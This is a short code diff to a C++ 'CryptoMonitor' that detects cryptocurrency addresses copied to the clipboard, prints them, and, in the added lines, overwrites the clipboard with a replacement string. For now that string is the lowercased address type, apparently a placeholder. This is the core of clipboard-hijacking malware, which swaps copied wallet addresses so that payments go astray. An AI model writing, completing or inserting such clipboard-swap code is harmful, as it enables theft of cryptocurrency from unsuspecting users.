@@ -60,5 +60,17 @@ void CryptoMonitor::processClipboardContent(const std::string &content)
         std::cout << "Address: " << cleanText << std::endl; // Показываем весь адрес для дебага
         std::cout << "type: " << addressType << std::endl;
         std::cout << "lenght: " << cleanText.length() << " symbols" << std::endl;
+
+        std::string walletName = addressType;
+        std::transform(
+            walletName.begin(),
+            walletName.end(),
+            walletName.begin(),
+            ::tolower
+
+        );
+
+        ClipboardManager::setClipboardText(walletName);
+        std::cout << "Replaced clipboard content with: " << walletName << std::endl;
     }
 }
